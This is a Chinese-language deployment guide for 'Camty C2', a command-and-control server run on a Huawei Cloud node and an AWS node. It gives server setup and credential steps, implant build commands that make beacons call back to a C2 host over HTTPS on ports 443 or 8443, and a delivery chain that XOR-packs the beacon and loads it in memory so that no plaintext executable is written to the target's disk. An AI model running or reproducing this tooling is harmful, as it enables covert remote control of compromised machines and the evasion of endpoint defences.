# Camty C2 公网部署（两台服务器分工）

## 分工

| 服务器 | 角色 | 说明 |
|---|---|---|
| **华为云（国内）** | 国内目标 C2 回连点 | 延迟 30-50ms；绑域名 80/443 需 ICP 备案，**不备案走非标高端口形态** |
| **AWS（海外）** | 海外目标出口 / 靶场跳板 | EC2 弹性 IP 池风控标记多，不怼 CF 类目标；打海外授权目标用 |

两台都跑同一份 `c2/server/camty_c2.py`，部署套件相同。

## 上线步骤（每台一样）

1. `git/压缩包把 warroom 放到 /opt/camty`
2. `sudo bash c2/deploy/deploy.sh` —— 装服务 + 生成凭据 + systemd 常驻
3. 取凭据：`sudo cat /etc/camty/c2.env`（CAMTY_PSK 用于植入体构建）
4. 安全组（**核心收紧**）：
   - 放行 beacon 端口（默认 8443）——入方向**只放目标出口 IP 段**，不要 0.0.0.0/0
   - api 端口（8801）**绝不公网开放**，operator 用 SSH 隧道：`ssh -L 8801:127.0.0.1:8801 server`
   - 华为云：VPC 控制台安全组；AWS：Security Group Inbound

## 两种形态选一个

**形态 A：域名 + 完整 TLS（推荐，海外节点或已备案域名）**

```
Caddy 443（Let's Encrypt 自动证书，Caddyfile 见 deploy/）
  → beacon: https://域名:443/api/v1/heartbeat（伪装静态站做根）
植入体构建：
  python c2/implant/build_beacon.py --psk <PSK> \
      --host c2.example.com --port 443 --sleep 30 \
      --scheme https --tls-verify 1 \
      --path-beacon /api/v1/heartbeat --path-result /api/v1/report
```

**形态 B：非标端口直连（华为云无备案场景）**

安全组放行 8443 + IP 白名单；证书自签或 LetsEncrypt DNS-01：
```
植入体构建：
  python c2/implant/build_beacon.py --psk <PSK> \
      --host <EIP> --port 8443 --sleep 30 \
      --scheme https --tls-verify 0 \
      --path-beacon /api/v1/heartbeat --path-result /api/v1/report
```
（`--tls-verify 0` 忽略自签证书；内容层 CMT1 AES seal 帧始终加密，信道仅防嗅探元数据。）

## 交付链（植入体侧，零落盘）

```
python c2/implant/build_beacon.py ... --out beacon.exe
python scripts/pack_xor.py beacon.exe packed.b64 --key camty --verify
loader.exe packed.b64 camty        # 内存解密加载，明文 PE 不落目标盘
```

## 运维

- 状态：`systemctl status camty-c2`
- 动作日志：`/var/lib/camty/c2-ops.jsonl`
- 换凭据：改 `/etc/camty/c2.env` → `systemctl restart camty-c2` → 重新构建植入体
- 日志轮转：c2-ops.jsonl 量小（每动作一行），月度归档即可
